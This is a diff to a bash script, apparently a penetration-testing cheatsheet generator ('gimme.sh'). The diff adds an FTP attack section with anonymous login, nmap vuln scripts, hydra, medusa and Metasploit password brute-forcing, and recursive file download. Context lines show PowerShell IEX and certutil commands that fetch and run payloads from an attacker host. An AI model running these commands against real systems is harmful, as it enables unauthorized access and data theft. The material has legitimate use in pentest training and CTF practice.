@@ -115,7 +115,7 @@ case $3 in
 		 	echo -e "=======$BRed Windows $BWhite=============================================$BWhite"
 		 	echo -e "[$BGreen Powershell $BWhite] :$BBlue powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://$BYellow$1$BBlue:$BYellow$2$BBlue/file.exe','C:\destination\path\\\file.exe')\"$BWhite"
 		 	echo -e "[$BGreen Powershell $BWhite] :$BBlue powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://$BYellow$1$BBlue:$BYellow$2$BBlue/file.ps1')$BWhite"
-			echo -e "[$BGreen certutil $BWhite] :$BBlue certutil.exe -urlcache -split -f 'http://$BYellow$1$BBlue:$BYellow$2$BBlue/file.exe' file.exe"
+			echo -e "[$BGreen certutil $BWhite] :$BBlue certutil.exe -urlcache -split -f 'http://$BYellow$1$BBlue:$BYellow$2$BBlue/file.exe' file.exe$BWhite"
 		 	echo -e "-----------------------------------------------------------"
 		 	echo -e "[$BGreen FTP $BWhite]"
 		 	echo -e "$BPurple Setup FTP Server On Attacker Machine$BWhite"
@@ -194,14 +194,139 @@ function gobuster()
 			fi
 }
 
+function ftp()
+{
+			echo -e "$BWhite====================== ftp ====================="
+
+			echo -e "[$BGreen FTP $White]"
+		 	echo -e "$BPurple Connection$White"
+			if [ "$2" == "" ]; then
+				echo -e "$White ftp $BYellow$1$White"
+			else
+				echo -e "$White ftp $BYellow$1 $2 $White"
+			fi
+			if [ "$2" == "" ]; then
+				echo -e "$White telnet $BYellow$1 21 $White"
+			else
+				echo -e "$White telnet $BYellow$1 $2 $White"
+			fi
+			if [ "$2" == "" ]; then
+				echo -e "$White netcat $BYellow$1 21 $White"
+			else
+				echo -e "$White netcat $BYellow$1 $2 $White"
+			fi
+
+			echo -e "$BPurple Banner Grabbing$White"
+			echo -e "$White telnet -vn $BYellow$1 $2 $White"
+
+			echo -e "$BPurple Anonymous login$White"
+			echo -e "$White ftp $BYellow$1 $2 $White"
+			echo -e "$White anonymous $White"
+			echo -e "$White anonymous $White"
+			echo -e "$White >ls -al $Cyan# List all files (even hidden) (yes, they could be hidden) $White"
+			echo -e "$White >binary $Cyan# Set transmission to binary instead of ascii $White"
+			echo -e "$White >ascii $Cyan # Set transmission to ascii instead of binary $White"
+			echo -e "$White >bye #exit $White"
+
+			echo -e "$BPurple nmap ftp script$White"
+			if [ "$2" == "" ]; then
+				echo -e "$White nmap -oA nmap/ftp.nmap -script 'not brute and not dos and *ftp*' --script-args= -d -Pn -v -p 21 $BYellow$1 $White"
+			else
+				echo -e "$White nmap -oA nmap/ftp.nmap -script 'not brute and not dos and *ftp*' --script-args= -d -Pn -v -p $BYellow$2 $1 $White"
+			fi
+
+			echo -e "$BPurple nmap ftp vuln scriptt$White"
+			if [ "$2" == "" ]; then
+				echo -e "$White nmap --script=ftp-* -p 21 $BYellow$1 $White"
+			else
+				echo -e "$White nmap --script=ftp-* -p $BYellow$2 $1 $White"
+			fi	
+		 	
+			echo -e "$BPurple Bruteforce password known username $White"
+			if [ "$2" == "" ]; then
+				echo -e "$White hydra -l $Green<User>$White -P /usr/share/wordlists/rockyou.txt ftp://$BYellow$1$White:21 $White"
+				echo -e "$White medusa -h $BYellow$1$White -u $Green<User>$White -P /usr/share/wordlists/rockyou.txt -M ftp$White" 
+			else
+				echo -e "$White hydra -l <User> -P /usr/share/wordlists/rockyou.txt ftp://$BYellow$1:$2 $White"
+			fi	
+			echo -e "	/usr/share/wordlists/metasploit/unix_passwords.txt"
+			echo -e "	/usr/share/john/password.lst"
+			echo -e "	/usr/share/wordlists/wfuzz/others/common_pass.txt"
+
+			echo -e "$BPurple User Enumeration$White"
+			echo -e "$Blue https://github.com/pentestmonkey/ftp-user-enum/blob/master/ftp-user-enum.pl $White"	
+			echo -e "$White ftp-user-enum.pl -U$Green users.txt $White-t $BYellow$1 $White"
+			echo -e "$Cyan Metasploit"
+			echo -e "$White use auxiliary/scanner/ftp/ftp_login"
+			echo -e "$White msf auxiliary(ftp_login) > show options"
+			echo -e "$White msf auxiliary(ftp_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt"
+			echo -e "$White msf auxiliary(ftp_login) > set USER_FILE users.txt"
+			echo -e "$White msf auxiliary(ftp_login) > set RHOSTS $BYellow$1$White"
+			if [ "$2" != "" ]; then
+				echo -e "$White msf auxiliary(ftp_login) > set RPORT $BYellow$2$White"
+			fi
+			echo -e "$White msf auxiliary(ftp_login) > run"
+
+			echo -e "$BPurple Download files$White"
+			echo -e "$White ftp $1 $2"
+			echo -e "$White PASSIVE"
+			echo -e "$White BINARY"
+			echo -e "$White get <FILE>"
+			echo -e "$White mget <FILEs>" 
+
+			echo -e "$BPurple Download files recursively$White"
+			if [ "$2" != "" ]; then
+				echo -e "$White wget -r ftp://username:password@$1:$2/dir/*"
+			else
+				echo -e "$White wget -r ftp://username:password@$1/dir/*"
+			fi
+			if [ "$2" != "" ]; then
+				echo -e "$White wget -r ftp://$1:$2/dir/* --ftp-user=username --ftp-password=password"
+			else
+				echo -e "$White wget -r ftp://$1/dir/* --ftp-user=username --ftp-password=password"
+			fi
+
+			if [ "$2" != "" ]; then
+				echo -e "$White wget -r --user="anonymous" --password="" ftp://$1:$2/dir/*"
+			else
+				echo -e "$White wget -r --user="anonymous" --password="" ftp://$1/dir/*"
+			fi
+
+			echo -e "$BPurple Sort files based on file size$White"
+			echo -e "$White find . -type f -exec du -h {} + | sort -h"
+
+			echo -e "$BPurple Read all files $White"
+			echo -e "$While for file in \$(find . -type f); do echo \">> \$file <<\" && cat \$file; done $Cyan# Include .(dot)file and recursive $White"
+			echo -e "$white for i in *; do echo \">> \$i <<\" && cat \$i; done $Cyan# No .(dot) file and not recursive $White"
+
+			echo -e "$BWhite====================================================="
+
+}
+
+
+function tftp()
+{
+			echo -e "$BWhite====================== tftp ========================="
+			echo -e "$BWhite====================================================="
+}
 
 function validate_ip()
 {
-	if [[ $1 =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] && [[ $2 -lt 65536 && $2 -gt 0 ]] 
+	if [[ $1 =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]
 		then
   			:
 		else
-				 	echo -e "Invalid LHOST or LPORT Value !!!"
+				 	echo -e "Invalid RHOST or RPORT Value !!!"
+			exit
+		fi
+}
+function validate_port()
+{
+	if [[ $1 -lt 65536 && $1 -gt 0 ]] 
+		then
+  			:
+		else
+				 	echo -e "Invalid RPORT Value !!!"
 			exit
 		fi
 }
@@ -230,6 +355,10 @@ then
 		 	echo -e "			Syntax: gimme.sh --msf-venom LHOST LPORT"
 			echo -e "$BGreen	--gobuster$BWhite 	: Print gobuster Cheatsheet"
 		 	echo -e "			Syntax: gimme.sh --gobuster URL PORT"
+			echo -e "$BGreen	--ftp $BWhite 		: Print ftp Cheatsheet"
+		 	echo -e "			Syntax: gimme.sh --ftp RHOST RPORT"
+			 echo -e "$BGreen	--tftp $BWhite 		: Print ftp Cheatsheet"
+		 	echo -e "			Syntax: gimme.sh --tftp RHOST RPORT"
 		 	echo -e "$BWhite=================================================================="
 	exit
 fi
@@ -241,7 +370,8 @@ case $1 in
 				 	echo -e "Syntax: gimme.sh --rev-shell LHOST LPORT win/lin"
 			exit
 		fi
-		validate_ip $2 $3
+		validate_ip $2
+		validate_port $3
 		rev $2 $3 $4
 	;;
 	"--file-transfer")
@@ -250,7 +380,8 @@ case $1 in
 				 	echo -e "Syntax: gimme.sh --file-transfer LHOST LPORT win/lin"
 			exit
 		fi
-		validate_ip $2 $3
+		validate_ip $2
+		validate_port $3
 		ft $2 $3 $4
 	;;
 	"--msf-venom")
@@ -259,19 +390,53 @@ case $1 in
 				 	echo -e "Syntax: gimme.sh --msf-venom LHOST LPORT win/lin/web"
 			exit
 		fi
-		validate_ip $2 $3
+		validate_ip $2
+		validate_port $3
 		venom $2 $3 $4
 	;;
 	"--gobuster")
 		if [ $# -lt 2 ]
 		then
-				 	echo -e "Syntax: gimme.sh --gobuster URL<:PORT>"
+				 	echo -e "Syntax: gimme.sh --gobuster URL:PORT"
 			exit
 		fi
 		validate_url $2
 		gobuster $2
-	
 	;;
+	"--ftp")
+
+		echo $#
+
+		if [ $# -lt 2 ]
+		then
+				 	echo -e "Syntax: gimme.sh --ftp RHOST RPORT"
+			exit
+		fi
+
+		if [ $# -gt 3 ]
+		then
+				 	echo -e "Syntax: gimme.sh --ftp RHOST RPORT"
+			exit
+		fi
+
+		validate_ip $2
+		if [ $# -eq 3 ]
+		then
+				validate_port $3
+		fi
+		ftp $2 $3
+	;;
+	"--tftp")
+		if [ $# -lt 2 ]
+		then
+				 	echo -e "Syntax: gimme.sh --tftp RHOST RPORT"
+			exit
+		fi
+		validate_ip $2
+		validate_port $3
+		tftp $2 $3
+	;;
+
 	*)
 			 	echo -e "$BGreen D$BPurple u$BBlue d$BYellow e$BCyan .$BGreen .$BPurple . "
 
